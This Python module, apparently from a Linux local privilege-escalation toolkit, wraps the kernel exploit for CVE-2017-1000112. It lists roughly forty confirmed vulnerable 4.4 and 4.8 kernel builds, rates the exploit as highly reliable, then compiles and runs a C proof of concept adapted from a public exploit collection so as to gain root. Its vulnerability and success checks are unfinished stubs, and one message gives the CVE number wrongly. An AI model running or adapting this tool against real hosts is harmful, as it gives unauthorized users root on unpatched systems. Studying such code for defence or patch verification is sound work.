"""
adapted from:
https://github.com/SecWiki/linux-kernel-exploits/blob/master/2017/CVE-2017-1000112/poc.c
"""
import os
import subprocess
from exploits.exploit import Exploit
from constants import PLAYGROUND_PATH, LINUX_EXPLOIT_PATH, HIGH_RELIABILITY, color_print

class CVE20171000112(Exploit):
	def __init__(self):
		super().__init__()
		self.name = "CVE-2017-1000112"
		self.brief_desc = "An exploitable memory corruption flaw was found in the Linux kernel. " \
			"The append path can be erroneously switched from UFO to non-UFO in ip_ufo_append_data() " \
			"when building an UFO packet with MSG_MORE option. If unprivileged user namespaces are " \
			"available, this flaw can be exploited to gain root privileges."
		self.reliability = HIGH_RELIABILITY
		self.vulnerable_kernels = {
			"confirmed": [
				"4.4.0-21",
				"4.4.0-22",
				"4.4.0-24",
				"4.4.0-28",
				"4.4.0-31",
				"4.4.0-34",
				"4.4.0-36",
				"4.4.0-38",
				"4.4.0-42",
				"4.4.0-45",
				"4.4.0-47",
				"4.4.0-51",
				"4.4.0-53",
				"4.4.0-57",
				"4.4.0-59",
				"4.4.0-62",
				"4.4.0-63",
				"4.4.0-64",
				"4.4.0-66",
				"4.4.0-67",
				"4.4.0-70",
				"4.4.0-71",
				"4.4.0-72",
				"4.4.0-75",
				"4.4.0-78",
				"4.4.0-79",
				"4.4.0-81",
				"4.4.0-83",
				"4.8.0-34",
				"4.8.0-36",
				"4.8.0-39",
				"4.8.0-41",
				"4.8.0-45",
				"4.8.0-46",
				"4.8.0-49",
				"4.8.0-52",
				"4.8.0-54",
				"4.8.0-56",
				"4.8.0-58",
			],
			"potential": []
		}
		self.source_c_path = os.path.join(LINUX_EXPLOIT_PATH, "CVE20171000112.c")
		self.compilation_path = os.path.join(PLAYGROUND_PATH, "CVE20171000112")
		self.compilation_command = ["gcc", self.source_c_path, "-o", self.compilation_path]
		self.exploit_command = self.compilation_path

	def determine_vulnerability(self):
		pass

	def confirm_exploitation(self):
		"""
		confirm_exploitation

		Checks for implementation specific details that confirm successful kernel exploitation
		:return: True or False
		"""
		return False 			# TODO: complete this vuln check to check /tmp/nonce for a specific value

	def exploit(self):
		color_print("\t[*] compiling: \'{}\'".format(" ".join(self.compilation_command)))
		return_code = subprocess.call(self.compilation_command)
		if return_code == 0 and os.path.exists(self.compilation_path):
			color_print("\t[*] exploiting")
			subprocess.call(self.exploit_command)					# TODO: need to make it write a nonce to /tmp/nonce
			if self.confirm_exploitation():
				color_print("[+] exploitation of CVE201710012 successful!", color="green", bold=True)
			else:
				self.exploit_failure("not vulnerable to CVE201710012")

